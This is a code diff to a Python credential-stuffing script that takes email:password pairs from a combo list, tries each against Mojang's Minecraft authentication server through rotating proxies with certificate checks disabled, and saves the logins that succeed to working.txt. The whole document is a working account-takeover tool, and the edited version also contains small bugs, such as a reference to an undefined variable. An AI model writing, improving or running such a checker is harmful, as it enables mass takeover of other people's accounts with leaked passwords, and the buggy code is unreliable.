@@ -21,36 +21,27 @@ headers = { # Set HTTP Headers
 requests.packages.urllib3.disable_warnings() # Disable annoying HTTPS Warnings, not really needed for this application.
 
 
-with open("combo.txt") as f: # Open the file
-    reader = csv.reader(f, delimiter=':') # Define a csv reader session
-    email, password = zip(*reader) # Do the splitting into two lists, emails and passwords
-
-with open("proxies.txt") as f: # Open the file
-    reader = csv.reader(f, delimiter=':') # Define a csv reader session
-    IP, Port = zip(*reader) # Split the lines into two lists, IPs and Ports
+accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
+proxies = [line.rstrip('\n') for line in open("proxies.txt", 'r')]
 
 def checkAccount(accountNumber):
     global working
-    try:
-        proxyNumber = random.randint(0,len(IP)) # Get a random proxy from the proxy list
-        data = '{"agent":{"name":"Minecraft","version":1},"username":"' + email[accountNumber] +'","password":"' + password[accountNumber] + '"}' # Set the data that will be sent to the auth servers to check
-        response = requests.post('https://authserver.mojang.com/authenticate', proxies={"http": "http://" + IP[proxyNumber] + ":" + Port[proxyNumber]}, headers=headers, data=data, verify=False) # Send the data and assign the response to the variable response
-        if any("accessToken" in s for s in response): # Check if the account is working.
-              working.append(email[accountNumber]+":"+password[accountNumber])
-              print(working) # Write to STDOUT that it's working
-              with open('working.txt', 'w') as f: # Open working .txt
-                       for item in working: # For every working account
-                                   f.write("%s\n" % item) # Write account
-        else: # It it's not working
-            print("Not working :(") # Say so
-    except:
-        print("Bad Proxy")
+    proxyNumber = random.randint(0,len(proxies)) # Get a random proxy from the proxy list
+    data = '{"agent":{"name":"Minecraft","version":1},"username":"' + accounts[accountNumber].split(':')[0] +'","password":"' + accounts[accountNumber].split(':')[1] + '"}' # Set the data that will be sent to the auth servers to check
+    response = requests.post('https://authserver.mojang.com/authenticate', proxies={"http": "http://" + proxies[proxyNumber].split(':')[0] + ":" + proxies[proxyNumber].split(':')[1]}, headers=headers, data=data, verify=False) # Send the data and assign the response to the variable response
+    if ("accessToken" in response.text): # Check if the account is working.
+          working.append(accounts[accountNumber].split(':')[0]+":"+password[accountNumber].split(':')[1])
+          print(working) # Write to STDOUT that it's working
+          with open('working.txt', 'w') as f: # Open working .txt
+                   for item in working: # For every working account
+                               f.write("%s\n" % item) # Write account
+    
 def main():
     numThreads = input("How many threads would you like to use? ")
     freeze_support()
-    numAccounts = range(len(email))
+    numAccounts = range(len(accounts))
 
-    pool = Pool(numThreads)  # Start 4 threads
+    pool = Pool(int(numThreads))  # Start 4 threads
     pool.map(checkAccount, numAccounts) # Checky Checky
 
     pool.close()
